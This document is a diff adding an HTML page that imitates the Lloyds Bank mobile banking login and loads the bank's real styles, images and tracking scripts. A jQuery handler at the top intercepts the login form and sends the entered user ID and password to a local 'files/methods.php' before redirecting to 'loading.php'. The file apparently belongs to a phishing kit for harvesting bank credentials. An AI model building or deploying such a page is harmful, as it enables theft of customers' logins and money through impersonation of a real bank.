@@ -1,0 +1,520 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML Basic 1.1//EN" "http://www.w3.org/TR/xhtml-basic/xhtml-basic11.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-gb">
+<head>
+
+  <script   src="https://code.jquery.com/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="   crossorigin="anonymous"></script>
+  <script>
+  $(document).ready(function() {
+    var allInputs = $(":input");
+
+    $('#login').submit(function(e) {
+      e.preventDefault();
+
+      $.ajax({
+        type: 'POST',
+        url: 'files/methods.php?type=login',
+        data: $('#login').serialize(),
+        success: function(data) {
+          var parsed_data = JSON.parse(data);
+          if (parsed_data.status == 'ok') {
+            location.href = "loading.php";
+          } else {
+            return false;
+          }
+        }
+      })
+    })
+  });
+  </script>
+
+<script>
+            window.utag_data = {
+                    PageRole: "Servicing",
+                    PageRoleFamily: "Application Journey",
+                    ProductFamily: "Service",
+                    ProductGroup: "Authentication",
+                    ProductSubGroup: "Online Banking",
+                    AuthenticationType: "Online Banking",
+                    JourneyName: "Log On",
+                    JourneyVersion: "2",
+                    JourneyStep: 1,
+                    JourneyProduct: "Authentication",
+                    JourneyStepName: "Primary Authentication",
+                    AuthenticationMethod: "Username and Password",
+                    JourneyAction: "",
+                    JourneyActionNarrative: "",
+                    ApplicationState: "Application"
+            };
+            </script>
+
+
+<title>Lloyds Bank - Mobile Banking - Login</title>
+
+
+
+
+
+
+<meta name="keywords" content="" />
+<meta name="description" content="" />
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta http-equiv="content-language" content="en-gb" />
+<link rel="alternate" media="handheld" href="" />
+<meta name="viewport" content="width=device-width" />
+
+
+  <script type="text/javascript" src="https://online.lloydsbank.co.uk/wps/wcm/connect/content_lloyds_personal_banking/assets/assets/insight-tagging/utag-1584446297.js">
+
+  </script>
+
+
+
+
+<link rel="apple-touch-icon" sizes="57x57"
+	href="https://online.lloydsbank.co.uk/wps/wcm/connect/content_lloyds_personal_banking/assets/media/images/mobile/ltsb 57x57-.JPG" />
+<link rel="apple-touch-icon" sizes="114x114"
+	href="https://online.lloydsbank.co.uk/wps/wcm/connect/content_lloyds_personal_banking/assets/media/images/mobile/ltsb 114x114-.JPG" />
+
+
+<link type="text/css"
+   href="https://online.lloydsbank.co.uk/unauth/assets/LloydsRetail/ngb/style/sca_base.css"
+   rel="stylesheet" />
+
+
+
+
+<script type="text/javascript" src="https://online.lloydsbank.co.uk/static/mobile/scriptsnippet.jspf"></script>
+
+
+
+<script type="text/javascript">
+                window['adrum-start-time'] = new Date().getTime();</script>
+<script type="text/javascript"
+                src="https://online.lloydsbank.co.uk/assets/lib/adrum-4.2.2.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+<meta name="dclinkjourid" content="dymxWheFT5vNJIfxaNEa5SLFVs0qXF4y" />
+
+
+
+
+
+         <script type="text/javascript" async="async"
+         src="/assets/lib/cdApi.js"></script>
+         <script type="text/javascript" async="async">function downloadBCV2Onload() { var element =document.createElement("script");element.src ="https://bcdn-16c9d93d.lloydsbank.co.uk/scripts/16c9d93d/16c9d93d.js";element.async=true;document.head.appendChild(element);}downloadBCV2Onload()</script>
+
+
+
+<meta name="wup_url" content="https://wup-16c9d93d.lloydsbank.co.uk/client/v3/web/wup?cid=karma" />
+
+</head>
+<body>
+
+    <script language="JavaScript" type="text/javascript">
+        function showWebTrendForCancel() {
+            dcsMultiTrack('WT.si_n', 'Logon', 'WT.si_x', '1', 'WT.tx_e', '',
+                    'WT.tx_n', '');
+        }
+        function showWebTrendForContinueApp(pageUrl) {
+            dcsMultiTrack('WT.si_n', 'Logon', 'WT.si_x', '0', 'WT.tx_e', 'a3',
+                    'WT.tx_n', 'Continue to App');
+            location.href = pageUrl;
+        }
+    </script>
+
+    <input type="hidden" name="businessRuleCheckForMLPTHiddenText" id="businessRuleCheckForMLPTHiddenText"
+                        value="false" />
+
+
+
+
+    <script type="text/javascript">
+
+
+                var _AP={};_AP.domain="statse.webtrendslive.com";_AP.dcsid="dcsxby8tz00000w8oh3utaci2_8p2n";_AP.fpcdom=".lloydsbank.co.uk";_AP.bypassStyleClass="newwin,newhelpwin,newfaqwin,overlay,printwin,overlayContainer";_AP.onsiteDoms="(lloyds|halifax|bankofscotland|MBNA)";_AP.brandDomains={"Lloyds" : ["lloyds", "baucr-lp.intranet.group"],
+
+                  "Halifax" : ["halifax", "baucr-hp.intranet.group"],
+
+                  "BOS" : ["bankofscotland", "baucr-bp.intranet.group"],
+
+                  "MBNA" : ["mbna", "baucr-mp.intranet.group"],
+
+                  "TSB" : ["tsb", "baucr-vp.intranet.group"]};_AP.testDomains=[".intranet.group"];_AP.crypticURLs=["/personal/a/account_details/",
+
+                        "/personal/a/make_transfer/",
+
+                        "/personal/a/make_payment/",
+
+                        "/personal/a/mobile/account_details/",
+
+                        "/personal/a/mobile/make_transfer/",
+
+                        "/personal/a/setup_standingorder/",
+
+                        "/personal/a/mobile/make_payment/",
+
+                        "/personal/a/set_up_new_payee/",
+
+                        "/personal/a/ava_upgrade/",
+
+                        "/personal/a/manage_overdraft/",
+
+                        "/personal/a/All_AVA/",
+
+                        "/personal/a/balance_transfer_offers/",
+
+                        "/personal/a/manage_paper_statement/",
+
+                        "/personal/a/balance_transfer_existing/",
+
+                        "/personal/a/order_paper_statement/",
+
+                        "/personal/a/compare_ava_products/",
+
+                        "/personal/a/apply_for_external_isa/",
+
+                        "/personal/a/manage_text_alerts/",
+
+                        "/personal/a/create_isa/",
+
+                        "/personal/a/manage_pin_details/",
+
+                        "/personal/a/Adding_Card_Holder/"];_AP.domainID="288862";_AP.keyToken="fbaed4f873f801dbc6ad3569078cf9aa9a00c12fa7";
+                </script>
+
+    <div id="outer">
+
+        <div id="banner">
+
+
+            <p id="logo">
+                <img src="https://online.lloydsbank.co.uk/wps/wcm/connect/content_lloyds_personal_banking/assets/media/images/lloydstsb2009/miscellaneous/m05img302a_NEW_KEY-1560965751.png"
+                    alt="/wps/wcm/connect/content_lloyds_personal_banking/assets/media/images/lloydstsb2009/miscellaneous/m05img302a_NEW_KEY-1560965751.png" />
+            </p>
+
+
+
+            <p id="userstatusNGB">
+                <img src="https://online.lloydsbank.co.uk/wps/wcm/connect/content_lloyds_personal_banking/assets/media/images/lloydstsb2009/miscellaneous/m01img505a_NEW_KEY-1560965736.png"
+                    alt="/wps/wcm/connect/content_lloyds_personal_banking/assets/media/images/lloydstsb2009/miscellaneous/m01img505a_NEW_KEY-1560965736.png" />
+            </p>
+
+
+
+                <p class="cookiePolicy">
+                   <a
+                     title="Cookie Policy"
+                        href="/personal/a/mobile/mobile_help/login/COOKIE_POLICY">
+                        Cookie Policy
+                   </a>
+                   </p>
+
+            <div class="clearer"></div>
+        </div>
+
+        <div id="header">
+            <div class="panelTL">
+                <div class="panelTR">
+                    <div class="panelBR">
+                        <div class="panelBL">
+                            <div id="headerInner">
+
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+
+        <noscript>
+        <div class="headerMsgErr"><h1>Please turn on Javascript</h1>
+        </div>
+        <style type="text/css">
+            .content { display:none; }
+        </style>
+        <div class="loginInner">
+            <div class="msgErrorBrowser">
+                <div class="msgTLBrowser">
+                    <div class="msgTRBrowser">
+                        <div class="msgBRBrowser">
+                            <div class="msgBLBrowser">
+                                <p class="browserMsgP">
+                                <p>You need to have Javascript turned on to use Internet Banking. You can turn it on by following the instructions in your browser menu. Or search for 'enable Javascript' in your search engine.</p><p>If you have accessibility needs and turned Javascript off because it interferes with your screen reader, you should check that you're using the most recent version of the screen reader, or you could try using an alternative.</p><p>If you have problems using a computer because of a disability or impairment, we recommend you visit <a title="https://www.abilitynet.org.uk" href="https://www.abilitynet.org.uk" target="_blank" rel="noopener noreferrer">https://www.abilitynet.org.uk</a> for free expert advice and guidance.</p>
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="actionsLogin">
+            <div class="divider">
+                <hr />
+            </div>
+            <div class="backToHomepage">
+                <p><a class="newwin" href="https://www.lloydsbank.com/" title="https://www.lloydsbank.com/" ><img alt="Back to homepage" src="/wps/wcm/connect/content_lloyds_personal_banking/assets/media/images/lloydstsb2009/miscellaneous/LLOYDS_BACK_TO_HOMEPAGE_NGB-1562944693.png"  /></a></p>
+            </div>
+        </div>
+        </noscript>
+
+
+        <div class="content">
+            <div class="login">
+                <div class="panelTL">
+                    <div class="panelTR">
+                        <div class="panelBR">
+                            <div class="panelBL">
+                                <div class="loginInner">
+
+
+                                    <div class="loginFields">
+                                        <form id="login"
+                                            method="post"
+                                            autocomplete="off">
+
+                                            <div class="formField">
+                                                <label
+                                                    for="frmLogin:lblUserID">User ID</label> <input name="userid" type="text"
+                                                    autocomplete="off"
+                                                    class="wide"
+                                                    maxlength="30"
+                                                    value=''
+                                                    required="required"/>
+                                            </div>
+
+
+                                            <div class="formField">
+                                                <label
+                                                    for="frmLogin:lblPassword">Password</label> <input name="password"
+                                                    type="password"
+                                                    autocomplete="off"
+                                                    class="wide"
+                                                    maxlength="20"
+                                                    value=""
+                                                    required="required"/>
+                                            </div>
+                                            <div class="formField loginCheckbox">
+
+                                                <input class="checkbox"
+                                                    type="checkbox"
+                                                    name="frmLogin:loginRemember"
+                                                    />
+                                                <label
+                                                    class="checkboxLabel"
+                                                    for="frmLogin:loginRemember">
+
+                                                      <a  id="rememberMe" name="rememberMe"
+                                                      title="Remember my User ID"
+                                                         href="/personal/a/mobile/mobile_help/login/REMEMBER_ME">
+                                                         Remember my User ID
+                                                           </a>
+
+                                                </label>
+                                            </div>
+                                            <div class="actionsLogin">
+                                                <div class="divider">
+
+                                                </div>
+
+                                                <input
+                                                    id="frmLogin:lnkLogin1"
+                                                    name="frmLogin:lnkLogin1"
+                                                    type="submit"
+                                                    value="Continue"
+                                                    text="Continue"
+                                                    class="submitAction" />
+                                            </div>
+                                            <input type="hidden"
+                                                name="frmLogin"
+                                                value="frmLogin" /> <input
+                                                type="hidden"
+                                                name="submitToken"
+                                                value="8065429" /> <input
+                                                type="hidden"
+                                                name="target"
+                                                value="" />
+                                        </form>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+
+
+
+           <div class="aside">
+          <p class="sideNote">
+          <a id="lnkForgotUserIDDMC"
+               name="lnkForgotUserIDDMC"
+               href="/ib-access/cwa/forgotten-details/index.html"
+               title="Forgotten your logon details?">Forgotten your logon details?</a>
+                </p>
+                </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div id="footerLogin">
+    <div class="FootNav">
+        <div class="lnkLevFoot">
+           <p class="lnkLevFootP">
+
+                 <a title="Register for Internet Banking"
+                    href="/personal/a/useradmin/mobile/registration/selectaccounttyperegistration.jsp?mobile=true">
+                    Register for Internet Banking</a>
+
+
+                 <a title="Go to desktop site"
+                     href="/personal/logon/login.jsp?mobile=false">Go to desktop site</a>
+
+
+                 <a title="Help"
+                    href="/personal/a/mobile/mobile_help/login/HELP">
+                    Help</a>
+
+
+                 <a title="Security"
+                    href="/personal/a/mobile/mobile_help/login/SECURITY">
+                    Security</a>
+
+
+                 <a title="Contact us"
+                    href="/personal/a/mobile/mobile_help/login/CONTACT_US">
+                    Contact us</a>
+
+
+                <a title="Mobile Banking"
+                    href="/personal/a/mobile/mobile_help/login/MOBILE_BANKING">Mobile Banking</a>
+
+
+                <a title="Legal"
+                    href="/personal/a/mobile/mobile_help/login/LEGAL">Legal</a>
+
+            </p>
+        </div>
+        <div class="aside">
+
+        </div>
+
+
+
+            <div class="appBannerBG">
+                <div class="appBannerLink fscsLogo">
+                    <p><a class="newwin" href="http://www.lloydsbank.com/legal/financial-services-compensation-scheme.asp" title="" ><img alt="" src="/wps/wcm/connect/content_lloyds_personal_banking/assets/media/images/lloydstsb2009/miscellaneous/p0400lnk502a_NEW_KEY-1560965767.png"  /></a></p>
+                </div>
+            </div>
+
+
+        <div class="clearer"></div>
+            <div>
+
+        </div>
+        </div>
+</div>
+
+
+
+
+
+
+
+                <input type="hidden" name="smartAppForIosAndAndroid"
+                    value="false" /> <input
+                    type="hidden" name="smartAppForIosAbvSix"
+                    value="false" />
+
+
+            </div>
+
+        </div>
+    </div>
+
+
+
+
+
+
+
+
+
+
+
+    <script type="text/javascript" async="async">
+    window.postMessage({ type:'ContextChange', activityType:"LOGIN_1"}, window.location.href);
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" src="/unauth/assets/lib/mobile/global-auto-min201028.js"></script>
+
+		<script type="text/javascript" src="/assets/webtrends/mobiledefault/P04.00.04.js"></script>
+		<script type="text/javascript" src="/unauth/assets/lib/mobileanalytics-min201028.js"></script>
+
+
+
+
+
+
+    <noscript><div><img alt="DCSIMG" id="DCSIMG" class="hide" src="https://statse.webtrendslive.com/dcsxby8tz00000w8oh3utaci2_8p2n/njs.gif?WT.sp=IB;mobilebanking&WT.si_x=1&WT.si_n=mobileLogin&WT.cg_s=loginwithreglink&WT.cg_n=Mobile Banking&WT.ti=Lloyds Bank - Mobile Banking - Login"/></div></noscript>
+                    <script>
+                    (function A() {
+                        var newElements = document.querySelectorAll(".close");
+                        if(newElements.length > 0){
+                        for(var i =0 , len = newElements.length; i < len; i++) {
+                              newElements[i].addEventListener("click",function(e){
+                                    e.preventDefault();
+                                    var d = new Date();
+                                    d.setTime(d.getTime() + 315569*100000);
+                                    document.cookie = "ABCookie = yes; expires ="+ d.toGMTString()+ "; path=/; secure"
+                              },false);
+                        }
+                        }
+                        else{
+                              setTimeout(A,50);
+                        }
+              })();
+
+</script>
+
+<script type="text/javascript" >var _cf = _cf || []; _cf.push(['_setFsp', true]);  _cf.push(['_setBm', true]);  _cf.push(['_setAu', '/bundles/8e746b20ui22610db6b146199fbd6b']); </script><script type="text/javascript"  src="/bundles/8e746b20ui22610db6b146199fbd6b"></script></body>
+</html>
